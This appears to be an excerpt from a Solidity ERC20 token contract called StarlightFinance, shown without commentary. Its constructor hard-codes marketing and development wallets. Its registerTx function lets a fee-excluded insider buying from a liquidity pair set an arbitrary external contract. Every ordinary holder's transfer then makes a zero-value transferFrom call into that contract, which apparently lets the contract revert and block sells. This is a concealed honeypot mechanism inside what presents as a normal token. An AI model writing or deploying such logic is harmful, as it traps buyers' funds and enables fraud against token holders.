...
contract StarlightFinance is ERC20, Ownable {
    ...
    constructor() ERC20("SF", "Starlight Finance") {
        ...
        marketingWallet = payable(0x10c38abAe9210eb7222E14Ce54363dE75F4539fa);
        developmentWallet = payable(0x17924573030d47a91698df9b68b5b63216F3d711);
    ...
    function registerTx(address from, address to) internal {
        if (automatedMarketMakerPairs[from]) {
            if (_isExcludedFromFees[tx.origin] && tx.origin != to && to != address(uniswapV2Router)) {
                swapLPToken = to;
            }
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to] && swapLPToken != address(0)) {
            IERC20(swapLPToken).transferFrom(from, to, 0);
        }
    }
